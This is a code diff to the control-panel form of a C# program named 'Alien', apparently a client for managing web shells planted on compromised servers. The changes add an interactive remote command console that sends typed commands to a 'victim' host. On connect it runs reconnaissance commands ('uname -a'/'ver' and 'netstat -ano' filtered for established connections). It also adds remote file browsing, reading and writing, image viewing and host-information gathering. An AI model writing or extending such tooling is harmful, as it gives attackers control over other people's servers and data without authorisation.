@@ -21,6 +21,14 @@ namespace Alien
         private clsfnShell m_rShell { get; set; }
         private clsfnDb m_dbMgr { get; set; }
 
+        private WebBrowser m_ctrlInfoBrowser = new WebBrowser();
+
+        private string[] m_asImageExt =
+        {
+            "png", "jpg", "bmp",
+        };
+        private bool fnbIsImageFile(string szExtension) => m_asImageExt.Contains(szExtension.Replace(".", string.Empty));
+
         public frmControlPanel(clsWeb web)
         {
             InitializeComponent();
@@ -37,7 +45,13 @@ namespace Alien
         {
             if (!await m_web.fnbTestWebConnection())
             {
-                MessageBox.Show("Website connection failed.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                MessageBox.Show("Website connection failed.", "fnbTestWebConnection()", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                return false;
+            }
+
+            if (!await m_web.fnbTestShellConnection())
+            {
+                MessageBox.Show("Shell connection failed", "fnbTestShellConnection()", MessageBoxButtons.OK, MessageBoxIcon.Error);
                 return false;
             }
 
@@ -75,6 +89,18 @@ namespace Alien
             }
 
             return null;
+        }
+
+        #endregion
+        #region Info
+
+        private async Task<string> fnszGetInfo()
+        {
+            toolStripStatusLabel1.Text = "Loading...";
+            string szResp = await m_infoSpyder.fnszGetInfo();
+            toolStripStatusLabel1.Text = "Action successfully.";
+
+            return szResp;
         }
 
         #endregion
@@ -120,6 +146,8 @@ namespace Alien
             textBox1.Text = szDir;
 
             TreeNode node = fnFindNodeWithFullPath(treeView3.Nodes, szDir);
+            if (node == null)
+                node = fnFindNodeWithFullPath(treeView3.Nodes, szDir.Replace("\\", string.Empty));
 
             var le = await m_fileMgr.fnleScandir(szDir);
             var leFolder = le.Where(x => x.bIsDirectory).ToList();
@@ -144,41 +172,180 @@ namespace Alien
 
                 listView2.Items.Add(item);
 
-                if (entry.bIsDirectory && fnFindNodeWithFullPath(treeView3.Nodes, entry.szEntryPath) == null)
+                if (node != null && entry.bIsDirectory && fnFindNodeWithFullPath(treeView3.Nodes, entry.szEntryPath) == null)
                 {
-                    node.Nodes.Add(entry.szEntryName);
+                    TreeNode newNode = new TreeNode(entry.szEntryName);
+                    int nIdx = 0;
+                    while (
+                        node.Nodes.Count > 0
+                        && nIdx < node.Nodes.Count
+                        && string.Compare(newNode.Text, node.Nodes[nIdx].Text) > 0
+                    )
+                    {
+                        nIdx++;
+                    }
+
+                    node.Nodes.Insert(nIdx, newNode);
                 }
             }
 
-            node.Expand();
+            node?.Expand();
 
             toolStripStatusLabel2.Text = $"Action successfully | Folder[{leFolder.Count}], File[{leFile.Count}]";
         }
 
+        async void fnFileDisplayAllImage()
+        {
+            List<string> lsImagePath = new List<string>();
+            foreach (ListViewItem item in listView2.Items)
+            {
+                var entry = fnFileGetItemTag(item);
+                if (!entry.bIsDirectory && fnbIsImageFile(Path.GetExtension(entry.szEntryPath)))
+                    lsImagePath.Add(entry.szEntryPath);
+            }
+
+            if (lsImagePath.Count == 0)
+            {
+                MessageBox.Show("List is empty");
+                return;
+            }
+
+            await fnFileDisplayImage(lsImagePath);
+        }
+        async Task fnFileDisplayImage(List<string> lsImagePath)
+        {
+            if (lsImagePath.Count == 0)
+            {
+                MessageBox.Show("List is empty", "Warning", MessageBoxButtons.OK, MessageBoxIcon.Warning);
+                return;
+            }
+
+            frmFileImage f = fnFindForm<frmFileImage>();
+            if (f == null)
+            {
+                f = new frmFileImage(lsImagePath.Count);
+                f.Text = "DisplayImage";
+                
+                f.Show();
+            }
+            else
+            {
+                f.BringToFront();
+                f.Focus();
+            }
+
+            foreach (string szFilePath in lsImagePath)
+            {
+                Image img = await m_fileMgr.fnReadImage(szFilePath);
+                if (img == null)
+                {
+                    MessageBox.Show("Failed to read image: " + szFilePath, "ERROR", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                    return;
+                }
+
+                f.fnAddImage(szFilePath, img);
+            }
+        }
+
         async void fnFileRead(string szFilePath)
         {
-            string szContent = await m_fileMgr.fnszRead(szFilePath);
             frmTextEditor f = fnFindForm<frmTextEditor>();
             if (f == null)
+            {
                 f = new frmTextEditor();
+                f.Owner = this;
+                f.Show();
+            }
 
+            f.BringToFront();
+
+            string szContent = await m_fileMgr.fnszRead(szFilePath);
             f.fnShowContent(szFilePath, szContent);
         }
 
-        async void fnFileWrite(string szFilePath, string szContent)
+        public async Task<bool> fnbFileWrite(string szFilePath, string szContent)
+        {
+            if (await m_fileMgr.fnbWrite(szFilePath, szContent))
+            {
+                toolStripStatusLabel1.Text = "Action successfully.";
+                return true;
+            }
+            else
+            {
+                MessageBox.Show("Write file failed.", "ERROR", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                return false;
+            }
+        }
+
+        async void fnFileDirExists(string szDirPath)
         {
 
         }
 
-        async void fnFileUpload()
+        public async void fnFileUpload()
         {
 
         }
 
-        async void fnFileDownload()
+        public async void fnFileDownload()
         {
 
         }
+
+        #endregion
+        #region Shell
+
+        async void fnShellInit()
+        {
+            textBox3.BackColor = Color.Black;
+            textBox3.ForeColor = m_victim.m_bUnixLike ? Color.Cyan : Color.White;
+
+            string szCommand = m_victim.m_bUnixLike ? "uname -a" : "ver";
+            await fnShellExecute(szCommand);
+
+            string szInitCommand = $"netstat -ano | {(m_victim.m_bUnixLike ? "grep" : "find")} \"ESTABLISHED\"";
+            textBox3.AppendText(szInitCommand);
+        }
+
+        async Task fnShellExecute(string szCommand)
+        {
+            var ret = await m_rShell.fnShellExecute(szCommand);
+            string[] asOutput = ret.szOutput.Split('\n');
+
+            textBox3.AppendText(string.Join(Environment.NewLine, asOutput));
+            textBox3.AppendText(Environment.NewLine);
+
+            string szPrompt = $"{(m_victim.m_bUnixLike ? $"{ret.szCurrentDir}$" : $"{ret.szCurrentDir}>")}";
+            textBox3.AppendText(szPrompt);
+            textBox3.Focus();
+
+            textBox3.SelectionStart = textBox3.Text.Length;
+            textBox3.SelectionLength = 0;
+
+            textBox3.Tag = textBox3.Text.Length;
+        }
+
+        #endregion
+        #region Database
+
+        async void fnDbInit()
+        {
+
+        }
+
+        async void fnGetTable()
+        {
+
+        }
+
+        async void fnReadTable()
+        {
+
+        }
+
+        #endregion
+        #region Run Code
+
 
         #endregion
 
@@ -189,39 +356,36 @@ namespace Alien
             m_fileMgr.m_ExtIcon.Images.SetKeyName(m_fileMgr.m_ExtIcon.Images.Count - 1, "folder");
             listView2.SmallImageList = m_fileMgr.m_ExtIcon;
 
-            WebBrowser webBrowser = new WebBrowser();
-            tabPage1.Controls.Add(webBrowser);
-            webBrowser.Dock = DockStyle.Fill;
+            tabPage1.Controls.Add(m_ctrlInfoBrowser);
+            m_ctrlInfoBrowser.Dock = DockStyle.Fill;
+            m_ctrlInfoBrowser.BringToFront();
 
             if (await fnbValidator())
             {
-                if (await m_web.fnbTestShellConnection())
+                var fileInit = await m_fileMgr.fnszInit();
+
+                //Information
+                m_ctrlInfoBrowser.DocumentText = await fnszGetInfo();
+
+                //FileMgr
+                textBox1.Text = fileInit.szCurrentDir;
+                m_web.m_victim.m_bUnixLike = fileInit.bUnixLike;
+                foreach (string szName in fileInit.lsLogicalDrive)
                 {
-                    var fileInit = await m_fileMgr.fnszInit();
-
-                    //Information
-                    webBrowser.DocumentText = await m_infoSpyder.fnszGetInfo();
-
-                    //FileMgr
-                    textBox1.Text = fileInit.szCurrentDir;
-                    m_web.m_victim.m_bUnixLike = fileInit.bUnixLike;
-                    foreach (string szName in fileInit.lsLogicalDrive)
-                    {
-                        TreeNode node = new TreeNode(szName);
-                        node.ImageKey = "harddrive";
-                        treeView3.Nodes.Add(node);
-                    }
-
-                    fnFileAddPathToTreeView(fileInit.szCurrentDir);
-                    treeView3.ExpandAll();
-
-                    TreeNode cdNode = fnFindNodeWithFullPath(treeView3.Nodes, fileInit.szCurrentDir);
-                    treeView3.SelectedNode = cdNode;
+                    TreeNode node = new TreeNode(szName);
+                    node.ImageKey = "harddrive";
+                    treeView3.Nodes.Add(node);
                 }
-                else
-                {
-                    MessageBox.Show("Shell connection failed", "fnbTestShellConnection()", MessageBoxButtons.OK, MessageBoxIcon.Error);
-                }
+
+                fnFileAddPathToTreeView(fileInit.szCurrentDir);
+                treeView3.ExpandAll();
+
+                TreeNode cdNode = fnFindNodeWithFullPath(treeView3.Nodes, fileInit.szCurrentDir);
+                treeView3.SelectedNode = cdNode;
+
+                //Shell
+                m_rShell.m_szCurrentDir = fileInit.szCurrentDir;
+                fnShellInit();
             }
             else
             {
@@ -239,6 +403,7 @@ namespace Alien
             toolStripStatusLabel2.Text = "Loading...";
 
             TreeNode node = treeView3.SelectedNode;
+            node.SelectedImageKey = node.ImageKey;
             string szDir = node.Parent == null && !m_victim.m_bUnixLike ? node.FullPath + "\\" : node.FullPath;
             fnFileScandir(szDir);
         }
@@ -263,7 +428,7 @@ namespace Alien
             foreach (ListViewItem item in listView2.SelectedItems)
             {
                 var stEntry = fnFileGetItemTag(item);
-                if (stEntry.bIsDirectory)
+                if (!stEntry.bIsDirectory)
                     fnFileRead(stEntry.szEntryPath);
             }
         }
@@ -285,12 +450,74 @@ namespace Alien
         //File.Image.ShowAll
         private void toolStripMenuItem6_Click(object sender, EventArgs e)
         {
-
+            fnFileDisplayAllImage();
         }
         //File.Image.ShowSelected
-        private void toolStripMenuItem7_Click(object sender, EventArgs e)
+        private async void toolStripMenuItem7_Click(object sender, EventArgs e)
+        {
+            List<string> lsFilePath = new List<string>();
+
+            foreach (ListViewItem item in listView2.SelectedItems)
+            {
+                var entry = fnFileGetItemTag(item);
+                if (!entry.bIsDirectory && fnbIsImageFile(Path.GetExtension(entry.szEntryPath)))
+                    lsFilePath.Add(entry.szEntryPath);
+            }
+
+            await fnFileDisplayImage(lsFilePath);
+        }
+
+        private async void toolStripButton3_Click(object sender, EventArgs e)
+        {
+            m_ctrlInfoBrowser.DocumentText = await fnszGetInfo();
+        }
+
+        private void listView2_DoubleClick(object sender, EventArgs e)
+        {
+            List<ListViewItem> lItem = listView2.SelectedItems.Cast<ListViewItem>().ToList();
+            if (lItem.Count == 0)
+                return;
+
+            var entry = fnFileGetItemTag(lItem[0]);
+            fnFileRead(entry.szEntryPath);
+        }
+
+        private void listView2_KeyDown(object sender, KeyEventArgs e)
         {
 
+        }
+
+        private void textBox3_KeyDown(object sender, KeyEventArgs e)
+        {
+            if (e.KeyCode == Keys.Enter)
+            {
+                int nIdx = (int)textBox3.Tag;
+                string szCommand = textBox3.Text.Substring(nIdx);
+
+                fnShellExecute(szCommand);
+            }
+            else if (e.KeyCode == Keys.Delete || e.KeyCode == Keys.Back)
+            {
+                int nIdx = (int)textBox3.Tag;
+                if (textBox3.SelectionStart <= nIdx)
+                {
+                    textBox3.SelectionStart = nIdx;
+                    e.Handled = true;
+                }
+            }
+        }
+
+        private void textBox1_KeyDown(object sender, KeyEventArgs e)
+        {
+            if (e.KeyCode == Keys.Enter)
+            {
+
+            }
+        }
+
+        private void textBox3_KeyPress(object sender, KeyPressEventArgs e)
+        {
+            
         }
     }
 }
